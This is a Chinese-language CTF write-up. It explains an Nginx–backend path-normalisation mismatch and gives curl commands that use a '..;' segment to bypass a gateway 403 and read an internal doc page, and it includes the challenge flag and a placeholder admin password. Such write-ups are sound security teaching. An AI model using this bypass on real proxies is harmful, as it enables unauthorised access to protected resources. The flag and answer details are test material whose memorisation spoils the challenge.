# pathconfusion Writeup

## 漏洞点

环境由两层组成：

- **Nginx 网关**（唯一暴露面）：
  - `location = /doc.html { return 403; }` —— 内部文档被网关直接拒绝
  - `location /sc/ { proxy_pass http://backend$request_uri; }` —— 业务前缀**原样转发**（`$request_uri` 是未经归一化的原始 URI）
- **后端**（不直接暴露）复刻 Tomcat 系解析行为：
  1. 先剥离每个路径段中分号之后的路径参数（path parameter）
  2. 再做 RFC 3986 的 remove_dot_segments 归一化

关键差异：**Nginx 在做 location 匹配前会自己归一化 URI，但 `..;` 不是合法的点段，Nginx 不会折叠它**；转发时又把原始 `$request_uri` 原样传给后端。后端的"剥离分号参数 + 归一化"两步走完后，路径变成了 Nginx 早已 403 拦截的 `/doc.html`。

## 利用思路

```bash
# 1. 信息搜集：robots.txt 泄露内部文档路径
curl http://HOST:58000/robots.txt
#   Disallow: /doc.html

# 2. 直连被网关拦截
curl -i http://HOST:58000/doc.html        # 403

# 3. 朴素穿越不行：Nginx 归一化后仍是 /doc.html，照旧 403
curl -i --path-as-is "http://HOST:58000/sc/../doc.html"   # 403

# 4. 解析差异绕过：Nginx 不折叠 "..;"，原样转发给后端
curl -i --path-as-is "http://HOST:58000/sc/..;/doc.html"  # 200
```

`/sc/..;/doc.html` 的两步解析：

| 层 | 看到的路径 | 处理 |
|---|---|---|
| Nginx | `/sc/..;/doc.html` | 归一化不认识 `..;`，`/sc/` 前缀命中，按 `$request_uri` 原样转发 |
| 后端 | `/sc/..;/doc.html` | 剥 `;` 参数 → `/sc/../doc.html` → 归一化 → `/doc.html` |

页面正文"开发调试记录"一段即 `hctf{d0t5egm3nt_byp4ss_t0_doc}`。

## 额外收益

`doc.html` 同时是后两题的钥匙：里面列出了平台全部 API 端点，还附了一段联调抓包的管理员登录密文（题 2 素材）。

## exp

```bash
python3 exp.py http://HOST:58000
```

## 本实例（独立部署版）的漏洞面

赛题链"事故前全漏洞版"：路径穿越、前端私钥、请求头信任三个漏洞**全部存在**，
但只有本题 FLAG1 真实——用题2 手法解 doc.html 里的调试密文得到的是占位假口令
（`Admin@demo2026#Test`），用题3 手法读颜文轩档案得到"已回收"。低难度实例同时
承担为高难度提供线索的角色（接口文档 + 调试密文均在 doc.html 中）。
